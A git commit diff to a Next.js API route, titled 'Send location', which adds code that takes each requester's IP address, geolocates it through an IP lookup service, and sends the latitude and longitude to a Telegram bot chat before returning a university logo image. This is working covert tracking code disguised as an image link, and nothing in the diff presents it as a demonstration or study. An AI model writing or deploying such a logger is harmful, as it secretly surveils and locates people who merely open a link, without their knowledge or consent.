aa10f8d3b8ac0cea7af73dd4f8f9cb713984c739
Mukhammadyusuf Abdurakhimov <pap@uwussi.moe>
2023-05-18 15:19:55 -0700

    Send location

--- src/app/api/route.ts
+++ src/app/api/route.ts
@@ -20,6 +20,28 @@ export async function GET(request: Request) {
     }),
   });
 
+  const ipAddress = request.headers.get('x-real-ip');
+  const url = `http://ip-api.com/json/${ipAddress}`;
+
+  const address = await fetch(url, {
+    method: 'GET',
+    headers: { 'Content-Type': 'application/json' },
+  });
+
+  const data = await address.json();
+
+  // const location = `*${data.city}, ${data.regionName}, ${data.country}*`;
+
+  await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: sendTo,
+      latitude: data.lat,
+      longitude: data.lon,
+    }),
+  });
+
   //return image
   const image_url =
     'https://www.whitworth.edu/cms/media/whitworth/documents/administration/marketing-amp-communications/whitworth-logos/whitworth-logo-horizontal-rgb.png';
